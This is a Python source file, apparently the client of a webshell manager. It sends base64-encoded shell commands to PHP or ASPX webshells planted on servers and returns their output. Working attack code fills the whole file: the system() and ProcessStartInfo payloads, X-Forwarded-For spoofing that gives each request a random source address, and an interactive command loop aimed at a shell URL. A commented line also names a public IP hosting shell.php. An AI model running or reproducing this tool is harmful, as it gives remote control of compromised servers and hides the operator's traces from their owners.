import base64
import copy
import random
import re
import sys
import requests

from .payload import generate_template



class BaseEXP(object):
    
    current_dic = "."
    _headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0",
        "X-Forwarded-For": "1.1.1.1"
    }
    
    def __init__(self, url, pwd, lang, proxies=None):
        self._template = generate_template(pwd, lang)
        self._url = url
        self._pwd = pwd
        self._lang = lang
        self._proxies = proxies
    
    def flush_ip(self):
        """
        " This function is used to request by diffrent IP every time
        " If you use proxies, this is useless
        """
        self._headers["X-Forwarded-For"] = str(random.randint(1, 255))+\
            "."+str(random.randint(1, 255))+"."+str(random.randint(1, 255))+\
            "."+str(random.randint(1, 255))
    
    def post_cmd_shell(self, cmd):
        """
        " This is the main request function
        """
        self.flush_ip()
        self.parse_cmd(cmd)
        tmp = copy.deepcopy(self._template)
        if self._lang == "php":
            tmp["a0"] = base64.b64encode(tmp["a0"].format("$s=base64_decode($_POST['a1']);@system('cd %s%s%s'.$s);die();"   \
                                                          % ("/d " if self.sys=="win" else "", self.current_dic,            \
                                                             ("&&" if self.sys=="linux" else "&"))).encode("utf-8"))
        elif self._lang == "aspx":
            """
            " Here need to replace \ to \\, because aspx will remove \
            " I dont know the reason
            """
            tmp["a0"] = base64.b64encode((tmp["a0"] % ("/d ", self.current_dic.replace("\\", "\\\\"), "&")).encode("utf-8"))
        #print(base64.b64decode(tmp["a0"]))
        tmp["a1"] = base64.b64encode(cmd.encode("utf-8"))
        r = requests.post(self._url, headers=self._headers, data=tmp, proxies=self._proxies)
        del(tmp)
        try:
            return r.content.replace(b"\r", b"").decode(self.sys_encode)
        except:
            print("[!]Decode error, please change the encode")
            return r.content.replace(b"\r", b"")
    
    def __repr__(self):
        return "URL => {}   PWD =>{}   OS => {}   ENCODE => {}".format(self._url, self._pwd, self.sys, self.sys_encode)

    def judge_os(self):
        """
        " Use this function to identify the shells' OS
        " It is used by manager-Obj init()
        """
        text = self.post_cmd_shell("uname").lower()
        tmp = ""
        if "win" in text or "nt" in text:
            tmp = "win"
        elif "linux" in text:
            tmp = "linux"
        return self.sys == tmp

    @property
    def encode(self):
        return self.sys_encode
        
    @encode.setter
    def encode(self, e):
        if e not in ("gbk", "utf-8"):
            print("[!]Unrecognized encode")
            return
        self.sys_encode = e
    
    @property
    def pwd(self):
        return self._pwd
        
    @pwd.setter
    def pwd(self, pwd):
        self._pwd = pwd


class WindowsEXP(BaseEXP):
    
    sys = "win"
    sys_encode = "gbk"
    
    def __init__(self, url, pwd, lang, proxies=None):
        super().__init__(url, pwd, lang, proxies)
        try:
            self.identify_pwd()
        except requests.exceptions.ConnectionError:
            print("[!]Error! ", end='')
            print(self)            
            print("[!]Network error, can not connect to remote host or proxy server")
            sys.exit(-1)
        
    def identify_pwd(self):
        """
        " Identify shells' pwd (Print Working Dictionary)
        """
        if self._lang == "php":
            r = requests.post(self._url, data={self._pwd: "@system('cd');"}, proxies=self._proxies)
            self.current_dic = r.text.strip("\n").strip("\r")  
        elif self._lang == "aspx":
            r = requests.post(self._url, data={
                self._pwd: 'var err:Exception;try{var c=new System.Diagnostics.ProcessStartInfo('
                           'System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("Y21k")));'
                           'var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;'
                           'c.UseShellExecute=false;'
                           'c.RedirectStandardOutput=true;'
                           'c.RedirectStandardError=true;'
                           'e.StartInfo=c;'
                           'c.Arguments="/c cd";'
                           'e.Start();'
                           'out=e.StandardOutput;'
                           'EI=e.StandardError;'
                           'e.Close();'
                           'Response.Write(out.ReadToEnd()+EI.ReadToEnd());'
                           '}catch(err){'
                           'Response.Write("ERROR:// "+err.message);'
                           '}'
                           'Response.End();'
            }, proxies=self._proxies)
            self.current_dic = r.text.strip("\n").strip("\r")  
            #print(self.current_dic)
        
    def parse_cmd(self, cmd):
        """
        " Parse users' command
        " To change working dictionary by
        " cd [dictionary] & cmd
        """
        if cmd.strip(" ") == "cd":
            return
        if re.findall(r"[a-z]:", cmd.strip(" ")):
            self.current_dic = cmd.strip(" ")+"\\"
        if "cd" in cmd:
            tmp = cmd.replace("cd", "").strip(" ")
            tmp = tmp.replace("/", "\\")
            if tmp == ".." or tmp == "..\\":
                if self.current_dic[-2] != ":\\":
                    self.current_dic = '\\'.join(self.current_dic.split("\\")[:-1])
                    if len(self.current_dic) == 2:
                        self.current_dic += "\\"
                    return
            if ":" not in tmp:
                if len(self.current_dic) != 3:
                    self.current_dic += "\\"+tmp
                else:
                    self.current_dic += tmp
            else:
                self.current_dic = tmp
        if len(self.current_dic) == 2:
            self.current_dic += "\\"
        #if self.current_dic[-1] != "\\":
            #self.current_dic += "\\"


class LinuxEXP(BaseEXP):
    
    sys = "linux"
    sys_encode = "utf-8"
    
    def __init__(self, url, pwd, lang, proxies=None):
        super().__init__(url, pwd, lang, proxies)
        try:
            self.identify()
        except requests.exceptions.ConnectionError:
            print("[!]Error! ", end='')
            print(self)
            print("[!]Network error, can not connect to remote host or proxy server")
            sys.exit(-1)
    
    def identify(self):
        if self._lang == "aspx":
            return
        
        r = requests.post(self._url, data={self._pwd: "@system('pwd');"}, proxies=self._proxies)
        self.current_dic = r.text.strip("\n").strip("\r")
    
    def parse_cmd(self, cmd):
        """
        " Parse users' command
        " To change working dictionary by
        " cd [dictionary] && cmd (Windows is '&')
        """        
        if cmd.strip(" ") == "cd":
            return
        if "cd" == cmd[:2]:
            tmp = cmd.replace("cd", "").strip(" ")
            if tmp == ".." or tmp == "../":
                if self.current_dic != "/":
                    self.current_dic = '/'.join(self.current_dic.split("/")[:-1])
                if not self.current_dic:
                    self.current_dic = "/"                
                return
            if tmp[0] != "/":
                self.current_dic += "/"+tmp
            else:
                self.current_dic = tmp
        if not self.current_dic:
            self.current_dic = "/"
        #if self.current_dic[-1] != "/":
            #self.current_dic += "/"
        
        
if __name__ == "__main__":
    #url = "http://198.13.59.92/shell.php"
    url = "http://127.0.0.1/shell.aspx"
    a = WindowsEXP(url, "ck", "aspx")
    while 1:
        print(a.current_dic+"> ", end="")
        c = input()
        print(a.post_cmd_shell(c))
